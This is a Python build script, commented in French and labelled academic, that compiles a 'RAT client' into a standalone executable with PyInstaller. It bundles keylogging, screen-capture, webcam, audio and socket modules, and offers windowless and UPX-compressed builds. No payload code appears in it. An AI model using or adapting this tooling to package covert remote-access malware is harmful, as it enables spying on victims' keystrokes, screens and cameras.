#!/usr/bin/env python3
"""
Build Client Script - Script de compilation du client RAT
Utilise PyInstaller pour créer un exécutable standalone
Usage académique uniquement
"""

import os
import sys
import shutil
import argparse
import subprocess
import platform
from pathlib import Path
from datetime import datetime
from typing import List, Optional, Dict, Any

def get_build_info() -> Dict[str, Any]:
    """Récupère les informations de build"""
    return {
        'build_date': datetime.now().strftime('%Y-%m-%d %H:%M:%S'),
        'build_system': platform.platform(),
        'python_version': platform.python_version(),
        'architecture': platform.architecture()[0],
        'builder': os.environ.get('USER', os.environ.get('USERNAME', 'unknown'))
    }

def find_pyinstaller() -> Optional[str]:
    """Trouve l'exécutable PyInstaller"""
    try:
        result = subprocess.run(['pyinstaller', '--version'], 
                              capture_output=True, text=True)
        if result.returncode == 0:
            return 'pyinstaller'
    except FileNotFoundError:
        pass
    
    # Essayer avec python -m PyInstaller
    try:
        result = subprocess.run(['python', '-m', 'PyInstaller', '--version'], 
                              capture_output=True, text=True)
        if result.returncode == 0:
            return 'python -m PyInstaller'
    except FileNotFoundError:
        pass
    
    return None

def create_spec_file(args: argparse.Namespace) -> str:
    """Crée un fichier .spec personnalisé pour PyInstaller"""
    
    spec_content = f'''# -*- mode: python ; coding: utf-8 -*-
"""
PyInstaller spec file for RAT Client
Generated automatically by build_client.py
Build date: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}
"""

block_cipher = None

# Configuration des données à inclure
datas = [
    ('client/utils/config.py', 'client/utils/'),
    ('shared/', 'shared/'),
]

# Modules cachés nécessaires
hiddenimports = [
    'PIL._tkinter_finder',
    'PIL.Image',
    'PIL.ImageGrab', 
    'cv2',
    'numpy',
    'psutil',
    'pynput.keyboard',
    'pynput.mouse',
    'cryptography.fernet',
    'cryptography.hazmat.primitives.ciphers',
    'pyaudio',
]

# Exclusions pour réduire la taille
excludes = [
    'tkinter',
    'matplotlib',
    'scipy',
    'pandas',
    'jupyter',
    'IPython',
    'sphinx',
    'pytest',
    'setuptools',
]

a = Analysis(
    ['client/main.py'],
    pathex=[],
    binaries=[],
    datas=datas,
    hiddenimports=hiddenimports,
    hookspath=[],
    hooksconfig={{}},
    runtime_hooks=[],
    excludes=excludes,
    win_no_prefer_redirects=False,
    win_private_assemblies=False,
    cipher=block_cipher,
    noarchive=False,
)

pyz = PYZ(a.pure, a.zipped_data, cipher=block_cipher)

exe = EXE(
    pyz,
    a.scripts,
    {'[] if not args.onefile else "a.binaries,"}
    {'[] if not args.onefile else "a.zipfiles,"}
    {'[] if not args.onefile else "a.datas,"}
    [],
    name='{args.output_name}',
    debug={str(args.debug).lower()},
    bootloader_ignore_signals=False,
    strip=False,
    upx={str(args.upx).lower()},
    upx_exclude=[],
    runtime_tmpdir=None,
    console={str(not args.noconsole).lower()},
    disable_windowed_traceback=False,
    argv_emulation=False,
    target_arch=None,
    codesign_identity=None,
    entitlements_file=None,
    icon='{args.icon or ""}',
    version_file='{args.version_file or ""}',
)

{'coll = COLLECT(' if not args.onefile else ''}
{'    exe,' if not args.onefile else ''}
{'    a.binaries,' if not args.onefile else ''}
{'    a.zipfiles,' if not args.onefile else ''}
{'    a.datas,' if not args.onefile else ''}
{'    strip=False,' if not args.onefile else ''}
{'    upx=' + str(args.upx).lower() + ',' if not args.onefile else ''}
{'    upx_exclude=[],' if not args.onefile else ''}
{'    name="' + args.output_name + '",' if not args.onefile else ''}
{')' if not args.onefile else ''}
'''
    
    spec_file = f"{args.output_name}.spec"
    with open(spec_file, 'w', encoding='utf-8') as f:
        f.write(spec_content)
    
    print(f"📄 Fichier spec créé: {spec_file}")
    return spec_file

def create_version_file(args: argparse.Namespace) -> Optional[str]:
    """Crée un fichier de version Windows"""
    if platform.system().lower() != 'windows':
        return None
    
    version_content = f'''# UTF-8
VSVersionInfo(
  ffi=FixedFileInfo(
    filevers=(1, 0, 0, 0),
    prodvers=(1, 0, 0, 0),
    mask=0x3f,
    flags=0x0,
    OS=0x40004,
    fileType=0x1,
    subtype=0x0,
    date=(0, 0)
  ),
  kids=[
    StringFileInfo(
      [
      StringTable(
        u'040904B0',
        [StringStruct(u'CompanyName', u'RAT Project Academic'),
         StringStruct(u'FileDescription', u'Remote Administration Tool Client'),
         StringStruct(u'FileVersion', u'1.0.0.0'),
         StringStruct(u'InternalName', u'{args.output_name}'),
         StringStruct(u'LegalCopyright', u'© 2025 Academic Project'),
         StringStruct(u'OriginalFilename', u'{args.output_name}.exe'),
         StringStruct(u'ProductName', u'RAT Client'),
         StringStruct(u'ProductVersion', u'1.0.0.0'),
         StringStruct(u'Comments', u'Educational cybersecurity tool')])
      ]), 
    VarFileInfo([VarStruct(u'Translation', [1033, 1200])])
  ]
)
'''
    
    version_file = f"{args.output_name}_version.rc"
    with open(version_file, 'w', encoding='utf-8') as f:
        f.write(version_content)
    
    print(f"📋 Fichier de version créé: {version_file}")
    return version_file

def build_with_pyinstaller(args: argparse.Namespace, pyinstaller_cmd: str) -> bool:
    """Construit le client avec PyInstaller"""
    
    print("🔨 Compilation avec PyInstaller...")
    print(f"   Commande: {pyinstaller_cmd}")
    
    # Création du fichier spec si nécessaire
    if args.use_spec:
        spec_file = create_spec_file(args)
        build_args = [spec_file]
    else:
        build_args = ['client/main.py']
    
    # Construction de la commande PyInstaller
    cmd = pyinstaller_cmd.split() + build_args
    
    # Arguments de base
    if args.onefile:
        cmd.extend(['--onefile'])
    
    if args.noconsole:
        cmd.extend(['--noconsole', '--windowed'])
    
    if args.debug:
        cmd.extend(['--debug', 'all'])
    else:
        cmd.extend(['--log-level', 'WARN'])
    
    # Nom de sortie
    cmd.extend(['--name', args.output_name])
    
    # Répertoire de sortie
    cmd.extend(['--distpath', args.output_dir])
    cmd.extend(['--workpath', f"{args.output_dir}/build"])
    cmd.extend(['--specpath', f"{args.output_dir}/spec"])
    
    # Icon si spécifié
    if args.icon and os.path.exists(args.icon):
        cmd.extend(['--icon', args.icon])
    
    # Version file pour Windows
    if args.version_file and os.path.exists(args.version_file):
        cmd.extend(['--version-file', args.version_file])
    elif platform.system().lower() == 'windows':
        version_file = create_version_file(args)
        if version_file:
            cmd.extend(['--version-file', version_file])
    
    # UPX compression
    if args.upx:
        cmd.extend(['--upx-dir', args.upx_dir])
    else:
        cmd.extend(['--noupx'])
    
    # Modules cachés additionnels
    hidden_imports = [
        'PIL.Image', 'PIL.ImageGrab', 'cv2', 'numpy', 'psutil',
        'pynput.keyboard', 'pynput.mouse', 'cryptography.fernet',
        'pyaudio', 'wave', 'json', 'base64', 'threading', 'socket'
    ]
    
    for imp in hidden_imports:
        cmd.extend(['--hidden-import', imp])
    
    # Données à inclure
    data_files = [
        ('shared', 'shared'),
        ('client/utils', 'client/utils'),
    ]
    
    for src, dst in data_files:
        if os.path.exists(src):
            cmd.extend(['--add-data', f'{src}{os.pathsep}{dst}'])
    
    # Exclusions pour réduire la taille
    excludes = [
        'tkinter', 'matplotlib', 'scipy', 'pandas', 'jupyter',
        'IPython', 'sphinx', 'pytest', 'setuptools', 'pip'
    ]
    
    for exc in excludes:
        cmd.extend(['--exclude-module', exc])
    
    # Options supplémentaires
    if args.clean:
        cmd.extend(['--clean'])
    
    if args.noconfirm:
        cmd.extend(['--noconfirm'])
    
    # Affichage de la commande complète
    if args.verbose:
        print(f"📝 Commande complète: {' '.join(cmd)}")
    
    # Exécution
    try:
        print("⏳ Compilation en cours...")
        result = subprocess.run(cmd, check=True, capture_output=not args.verbose)
        
        if result.returncode == 0:
            print("✅ Compilation réussie!")
            return True
        else:
            print(f"❌ Échec de compilation (code: {result.returncode})")
            if result.stderr:
                print(f"Erreur: {result.stderr.decode()}")
            return False
            
    except subprocess.CalledProcessError as e:
        print(f"❌ Erreur lors de la compilation: {e}")
        if e.stderr:
            print(f"Stderr: {e.stderr.decode()}")
        return False
    except Exception as e:
        print(f"❌ Erreur inattendue: {e}")
        return False

def post_build_operations(args: argparse.Namespace):
    """Opérations post-compilation"""
    
    print("🔧 Opérations post-compilation...")
    
    # Recherche de l'exécutable généré
    if args.onefile:
        exe_path = Path(args.output_dir) / f"{args.output_name}.exe"
        if platform.system().lower() != 'windows':
            exe_path = Path(args.output_dir) / args.output_name
    else:
        exe_path = Path(args.output_dir) / args.output_name / f"{args.output_name}.exe"
        if platform.system().lower() != 'windows':
            exe_path = Path(args.output_dir) / args.output_name / args.output_name
    
    if not exe_path.exists():
        print(f"⚠️  Exécutable non trouvé: {exe_path}")
        return
    
    # Informations sur le fichier généré
    file_size = exe_path.stat().st_size
    print(f"📊 Taille de l'exécutable: {file_size:,} bytes ({file_size/1024/1024:.1f} MB)")
    
    # Test rapide de l'exécutable
    if args.test:
        print("🧪 Test rapide de l'exécutable...")
        try:
            result = subprocess.run([str(exe_path), '--version'], 
                                  capture_output=True, text=True, timeout=10)
            if result.returncode == 0:
                print("✅ Test basique réussi")
            else:
                print(f"⚠️  Test échoué (code: {result.returncode})")
        except subprocess.TimeoutExpired:
            print("⚠️  Test timeout")
        except Exception as e:
            print(f"⚠️  Erreur de test: {e}")
    
    # Création d'un fichier de build info
    build_info = get_build_info()
    build_info['executable_path'] = str(exe_path)
    build_info['file_size'] = file_size
    build_info['build_options'] = vars(args)
    
    info_file = Path(args.output_dir) / f"{args.output_name}_build_info.json"
    with open(info_file, 'w', encoding='utf-8') as f:
        import json
        json.dump(build_info, f, indent=2, ensure_ascii=False)
    
    print(f"📋 Informations de build sauvegardées: {info_file}")
    
    # Nettoyage si demandé
    if args.cleanup:
        print("🧹 Nettoyage des fichiers temporaires...")
        
        temp_dirs = [
            Path(args.output_dir) / "build",
            Path(args.output_dir) / "spec",
            Path("build"),
            Path("__pycache__")
        ]
        
        for temp_dir in temp_dirs:
            if temp_dir.exists():
                try:
                    shutil.rmtree(temp_dir)
                    print(f"   Supprimé: {temp_dir}")
                except Exception as e:
                    print(f"   Erreur suppression {temp_dir}: {e}")
        
        # Suppression des fichiers .spec et version
        temp_files = [
            f"{args.output_name}.spec",
            f"{args.output_name}_version.rc"
        ]
        
        for temp_file in temp_files:
            if os.path.exists(temp_file):
                try:
                    os.unlink(temp_file)
                    print(f"   Supprimé: {temp_file}")
                except Exception as e:
                    print(f"   Erreur suppression {temp_file}: {e}")

def main():
    """Fonction principale"""
    parser = argparse.ArgumentParser(description="Build script pour le client RAT")
    
    # Options de base
    parser.add_argument(
        '--output-name', '-n',
        default='rat-client',
        help='Nom de l\'exécutable de sortie'
    )
    parser.add_argument(
        '--output-dir', '-o',
        default='dist',
        help='Répertoire de sortie'
    )
    
    # Options PyInstaller
    parser.add_argument(
        '--onefile', '-F',
        action='store_true',
        help='Créer un seul fichier exécutable'
    )
    parser.add_argument(
        '--noconsole', '-w',
        action='store_true',
        help='Pas de fenêtre console (Windows)'
    )
    parser.add_argument(
        '--debug', '-d',
        action='store_true',
        help='Mode debug avec logs détaillés'
    )
    parser.add_argument(
        '--upx',
        action='store_true',
        help='Activer la compression UPX'
    )
    parser.add_argument(
        '--upx-dir',
        default='',
        help='Répertoire UPX personnalisé'
    )
    
    # Fichiers additionnels
    parser.add_argument(
        '--icon', '-i',
        help='Fichier d\'icône (.ico pour Windows)'
    )
    parser.add_argument(
        '--version-file', '-v',
        help='Fichier de version Windows'
    )
    
    # Options avancées
    parser.add_argument(
        '--use-spec',
        action='store_true',
        help='Utiliser un fichier .spec généré'
    )
    parser.add_argument(
        '--clean',
        action='store_true',
        help='Nettoyer avant compilation'
    )
    parser.add_argument(
        '--noconfirm',
        action='store_true',
        help='Pas de confirmation pour l\'écrasement'
    )
    parser.add_argument(
        '--verbose',
        action='store_true',
        help='Sortie détaillée'
    )
    
    # Post-compilation
    parser.add_argument(
        '--test',
        action='store_true',
        help='Tester l\'exécutable après compilation'
    )
    parser.add_argument(
        '--cleanup',
        action='store_true',
        help='Nettoyer les fichiers temporaires après compilation'
    )
    
    args = parser.parse_args()
    
    print("🏗️  Build Script RAT Client")
    print("=" * 40)
    
    # Vérification de PyInstaller
    pyinstaller_cmd = find_pyinstaller()
    if not pyinstaller_cmd:
        print("❌ PyInstaller non trouvé!")
        print("Installation: pip install pyinstaller")
        sys.exit(1)
    
    print(f"✅ PyInstaller trouvé: {pyinstaller_cmd}")
    
    # Vérification des fichiers source
    if not os.path.exists('client/main.py'):
        print("❌ Fichier source non trouvé: client/main.py")
        sys.exit(1)
    
    # Création du répertoire de sortie
    os.makedirs(args.output_dir, exist_ok=True)
    
    # Compilation
    success = build_with_pyinstaller(args, pyinstaller_cmd)
    
    if success:
        # Opérations post-compilation
        post_build_operations(args)
        
        print("\n🎉 Build terminé avec succès!")
        print(f"📁 Fichiers dans: {os.path.abspath(args.output_dir)}")
        
        # Instructions d'usage
        exe_name = f"{args.output_name}.exe" if platform.system().lower() == 'windows' else args.output_name
        if args.onefile:
            exe_path = os.path.join(args.output_dir, exe_name)
        else:
            exe_path = os.path.join(args.output_dir, args.output_name, exe_name)
        
        print(f"🚀 Exécutable: {exe_path}")
        print(f"   Usage: {exe_path} --server 127.0.0.1 --port 8888")
        
    else:
        print("\n❌ Build échoué!")
        sys.exit(1)

if __name__ == "__main__":
    main()